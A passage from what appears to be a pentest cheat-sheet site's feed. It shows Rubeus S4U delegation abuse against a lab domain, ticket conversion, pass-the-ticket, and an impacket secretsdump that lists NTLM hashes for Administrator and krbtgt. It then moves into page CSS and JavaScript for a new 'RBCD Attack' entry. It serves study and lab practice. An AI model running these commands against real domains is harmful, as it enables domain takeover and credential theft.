(_____ \      | |                     &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;   _____) )_   _| |__  _____ _   _  ___ &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  |  __  /| | | |  _ \| ___ | | | |/___)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  | |  \ \| |_| | |_) ) ____| |_| |___ |&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  |_|   |_|____/|____/|_____)____/(___/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;  v2.3.3 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Action: S4U&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Action: S4U&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Building S4U2self request for: &amp;#39;FS01$@REDELEGATE.VL&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Using domain controller: dc.redelegate.vl (10.129.31.186)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Sending S4U2self request to 10.129.31.186:88&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] S4U2self success!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Got a TGS for &amp;#39;DC$&amp;#39; to &amp;#39;FS01$@REDELEGATE.VL&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] base64(ticket.kirbi):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;      doIFgjCCBX6gAwIBBaEDAgEWooIEmTCCBJVhggSRMIIEjaADAg---[SNIP]---8bDVJFREVMRUdBVEUuVkypEjAQoAMCAQGhCTAHGwVGUzAxJA==&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating user &amp;#39;DC$&amp;#39; to target SPN &amp;#39;ldap/dc.redelegate.vl&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Building S4U2proxy request for service: &amp;#39;ldap/dc.redelegate.vl&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Using domain controller: dc.redelegate.vl (10.129.31.186)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Sending S4U2proxy request to domain controller 10.129.31.186:88&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] S4U2proxy success!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] base64(ticket.kirbi) for SPN &amp;#39;ldap/dc.redelegate.vl&amp;#39;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;      doIGMDCCBiygAwIBBaEDAgEWooIFRjCCBUJhggU+MIIFOqADAg---[SNIP]---MwIaADAgECoRowGBsEbGRhcBsQZGMucmVkZWxlZ2F0ZS52bA==&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Ticket successfully imported!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;5-convert-kirbi-to-ccache&#34;&gt;5. Convert kirbi to ccache&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;python3 rubeustoccache.py &amp;#39;&amp;lt;BASE64_TGS&amp;gt;&amp;#39; &amp;lt;DC_HOSTNAME&amp;gt;.kirbi &amp;lt;DC_HOSTNAME&amp;gt;.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; python3 rubeustoccache.py &lt;span class=&#34;s1&#34;&gt;&amp;#39;doIGMDCCBiygAwIBBaEDAgEWooIFRjCCBUJhggU+MIIFOqADAg---[SNIP]---MwIaADAgECoRowGBsEbGRhcBsQZGMucmVkZWxlZ2F0ZS52bA==&amp;#39;&lt;/span&gt; dc.kirbi dc.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;                 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;              By Solomon Sklash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;          github.com/SolomonSklash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;   Inspired by Zer1t0&amp;#39;s ticket_converter.py&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Writing decoded .kirbi file to dc.kirbi&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Writing converted .ccache file to dc.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] All done! Don&amp;#39;t forget to set your environment variable: export KRB5CCNAME=dc.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;6-secrets-dump&#34;&gt;6. Secrets Dump&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Pass-the-ticket&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;export KRB5CCNAME=&amp;lt;CCACHE&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass &amp;lt;DC&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s 10.129.234.50 &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-secretsdump -k -no-pass DC.REDELEGATE.VL&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Using the DRSUAPI method to get NTDS.DIT secrets&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;---[SNIP]---&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Cleaning up...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>RBCD Attack</title>
      <link>https://tldrbins.github.io/rbcd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rbcd/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid .cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        